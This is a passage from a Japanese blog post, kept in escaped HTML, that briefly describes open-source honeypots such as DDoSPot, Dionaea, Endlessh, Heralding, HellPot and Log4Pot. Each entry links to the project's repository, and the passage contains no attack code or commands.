&lt;h3 id=&quot;ddospot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ddospot&quot; aria-label=&quot;ddospot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;DDoSPot&lt;/h3&gt;
&lt;p&gt;「DDoSPot」はUDPベースのDDoS攻撃おキャッチするためのハニーポットです。&lt;/p&gt;
&lt;p&gt;以下のサービスをサポートしています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DNS server&lt;/li&gt;
&lt;li&gt;NTP server&lt;/li&gt;
&lt;li&gt;SSDP server&lt;/li&gt;
&lt;li&gt;CHARGEN server&lt;/li&gt;
&lt;li&gt;Random/mock UDP server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/aelth/ddospot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;aelth/ddospot: NTP, DNS, SSDP, Chargen and generic UDP-based amplification DDoS honeypot&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;dicompot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dicompot&quot; aria-label=&quot;dicompot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dicompot&lt;/h3&gt;
&lt;p&gt;「Dicompot 」は&lt;code class=&quot;language-text&quot;&gt;A Digital Imaging and Communications in Medicine (DICOM)&lt;/code&gt;をターゲットとしたハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/nsmfoo/dicompot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;nsmfoo/dicompot: DICOM Honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;DICOMとは、CTやMRI、CRなどで撮影した医用画像のフォーマットと、それらを扱う医用画像機器間の通信プロトコルの規格を指すようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/DICOM&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DICOM - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;初めて聞いた規格ですが、ポート104が一般的な通信ポートとして知られており、このポートを狙った攻撃も観測されているようです。&lt;/p&gt;
&lt;h3 id=&quot;dionaea&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#dionaea&quot; aria-label=&quot;dionaea permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dionaea&lt;/h3&gt;
&lt;p&gt;「Dionaea」は日本語でハエトリグサを意味するワードで、マルウェア収集を目的としたハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/DinoTools/dionaea&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;DinoTools/dionaea: Home of the dionaea honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「Dionaea」が取得したマルウェアは、&lt;code class=&quot;language-text&quot;&gt;binaries&lt;/code&gt;ディレクトリに保存される ようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://qiita.com/micci184/items/fce32a6d62493d289710&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;HoneypotのDionaeaでマルウェアを収集しちゃって、APIでスキャンして、結果をビジュアライズしちゃうぞ - Qiita&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;elasticpot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#elasticpot&quot; aria-label=&quot;elasticpot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ElasticPot&lt;/h3&gt;
&lt;p&gt;「ElasticPot」は脆弱なElasticsearchサーバをエミュレートし、Elasticsearchに対する攻撃をキャプチャするためのハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://gitlab.com/bontchev/elasticpot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Vesselin Bontchev / ElasticPot · GitLab&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;endlessh&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#endlessh&quot; aria-label=&quot;endlessh permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Endlessh&lt;/h3&gt;
&lt;p&gt;「Endlessh」はSSHターピットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/skeeto/endlessh&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;skeeto/endlessh: SSH tarpit that slowly sends an endless banner&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「ターピット」って何ぞ、って話ですが、サーバ側のレスポンスを故意に遅延させることによって攻撃者の時間やリソースを浪費させることを目的としたシステムです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://eset-info.canon-its.jp/malware_info/term/detail/00070.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ターピット | サイバーセキュリティ情報局&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「Endlessh」はSSHターピットであり、攻撃者のSSHクライアントをハングさせ、最大で数日程度の時間を浪費させます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://nullprogram.com/blog/2019/03/22/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Endlessh: an SSH Tarpit&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;glutton&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#glutton&quot; aria-label=&quot;glutton permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Glutton&lt;/h3&gt;
&lt;p&gt;「Glutton」は攻撃者と他のハニーポット間のプロキシとして機能し、MITMと同様の手法で攻撃者のトラフィックをキャプチャし、記録することができるハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/mushorg/glutton&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;mushorg/glutton: Generic Low Interaction Honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://cstayyab.medium.com/an-analysis-of-glutton-all-eating-honeypot-625adf70a33b&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;An analysis of Glutton — All Eating honeypot | by Muhammad Tayyab Sheikh (CS Tayyab) | Medium&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;heralding&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#heralding&quot; aria-label=&quot;heralding permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Heralding&lt;/h3&gt;
&lt;p&gt;「Heralding」は攻撃者が認証を試行する際のトラフィックや資格情報をキャプチャするためのハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/johnnykv/heralding&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;johnnykv/heralding: Credentials catching honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;「Heralding」を使用することで、攻撃者が使用する認証情報をキャプチャできます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sectechno.com/heralding-credentials-catching-honeypot/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Heralding - Credentials catching honeypot - SecTechno&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;hellpot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#hellpot&quot; aria-label=&quot;hellpot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HellPot&lt;/h3&gt;
&lt;p&gt;「HellPot」は&lt;a href=&quot;https://github.com/carlmjohnson/heffalump&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Heffalump&lt;/a&gt;をベースにしたハニーポットで、悪意のある攻撃者に無制限のストリームを送り、メモリやストレージをオーバーフローさせるハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/yunginnanet/HellPot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;yunginnanet/HellPot: HellPot is a portal to endless suffering meant to punish unruly HTTP bots.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SSHターピットとは違うアプローチのようですがこういう攻撃者へのカウンタートラップ的なハニーポットも結構あるんですね。&lt;/p&gt;
&lt;h3 id=&quot;honeypots&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#honeypots&quot; aria-label=&quot;honeypots permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Honeypots&lt;/h3&gt;
&lt;p&gt;「Honeypots」はネットワークトラフィックやBOTのアクティビティ、攻撃者の使用するクレデンシャル情報を監視することができるハニーポットです。&lt;/p&gt;
&lt;p&gt;「Honeypots」の中には23の異なるシンプルなハニーポットが組み込まれています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/qeeqbox/honeypots&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;qeeqbox/honeypots: 23 different honeypots in a single pypi package! (dns, ftp, httpproxy, http, https, imap, mysql, pop3, postgres, redis, smb, smtp, socks5, ssh, telnet, vnc, mssql, elastic, ldap, ntp, memcache, snmp, and oracle)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;T-Potに組み込まれているハニーポットの中にさらに複数のハニーポットが組み込まれているパターンは初めてですね。&lt;/p&gt;
&lt;h3 id=&quot;honeypy&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#honeypy&quot; aria-label=&quot;honeypy permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HoneyPy&lt;/h3&gt;
&lt;p&gt;「HoneyPy」はTCPやUDPのサービスをエミュレートして攻撃者のアクティビティをキャプチャすることができるハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/foospidy/HoneyPy&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;foospidy/HoneyPy: A low to medium interaction honeypot.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://honeypy.readthedocs.io/en/latest/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Home - HoneyPy Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;プラグインという単位でサービスを追加することで、DNSやTelnetなどのTCP/UDPのサービスに対しての攻撃をキャプチャできそうです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://honeypy.readthedocs.io/en/latest/plugins/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Plugins - HoneyPy Docs&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;honeysap&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#honeysap&quot; aria-label=&quot;honeysap permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;HoneySAP&lt;/h3&gt;
&lt;p&gt;「HoneySAP」はSAPシステムに対する攻撃をキャプチャするためのハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/SecureAuthCorp/HoneySAP&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;SecureAuthCorp/HoneySAP: HoneySAP: SAP Low-interaction research honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;特にSAPサービスを狙う攻撃者の目的や技術をとらえることができると説明書きにあります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://honeysap.readthedocs.io/en/latest/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;HoneySAP: SAP Low-interaction honeypot — HoneySAP 0.1.2 documentation&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;honeytrap&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#honeytrap&quot; aria-label=&quot;honeytrap permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Honeytrap&lt;/h3&gt;
&lt;p&gt;「Honeytrap」はTCPやUDPサービスをエミュレートして攻撃者のネットワークトラフィックをキャプチャします。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/armedpot/honeytrap/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;armedpot/honeytrap: Last download from git://git.carnivore.it/honeytrap.git of Honytrap by Tillmann Werner&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ipp-honey&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ipp-honey&quot; aria-label=&quot;ipp honey permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IPP Honey&lt;/h3&gt;
&lt;p&gt;「IPP Honey」は&lt;code class=&quot;language-text&quot;&gt;Internet Printing Protocol Honeypot&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://gitlab.com/bontchev/ipphoney&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Vesselin Bontchev / IPP Honey · GitLab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;インターネットに公開されているプリンタをエミュレートして、プリンタに対する攻撃をキャプチャできます。&lt;/p&gt;
&lt;h3 id=&quot;log4pot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#log4pot&quot; aria-label=&quot;log4pot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Log4Pot&lt;/h3&gt;
&lt;p&gt;「Log4Pot」は現在進行形で世界中に大きなインパクトを与えているLog4Shellの脆弱性「CVE-2021-44228」をターゲットとしたハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/thomaspatzke/Log4Pot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;thomaspatzke/Log4Pot: A honeypot for the Log4Shell vulnerability (CVE-2021-44228).&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;このハニーポットによってLog4Shellの悪用に関する振る舞いをキャプチャします。&lt;/p&gt;
&lt;h3 id=&quot;mailoney&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mailoney&quot; aria-label=&quot;mailoney permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mailoney&lt;/h3&gt;
&lt;p&gt;「Mailoney」はSMTPハニーポットです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/phin3has/mailoney&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;phin3has/mailoney: An SMTP Honeypot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SMTPポートに対する攻撃をキャプチャできます。&lt;/p&gt;
&lt;h3 id=&quot;medpot&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#medpot&quot; aria-label=&quot;medpot permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;medpot&lt;/h3&gt;
&lt;p&gt;「medpot」は&lt;code class=&quot;language-text&quot;&gt;HL7/FHIRハニーポット&lt;/code&gt;らしいです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://github.com/schmalle/medpot&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;schmalle/medpot: HL7 / FHIR honeypot&lt;/a&gt;&lt;/p&gt;
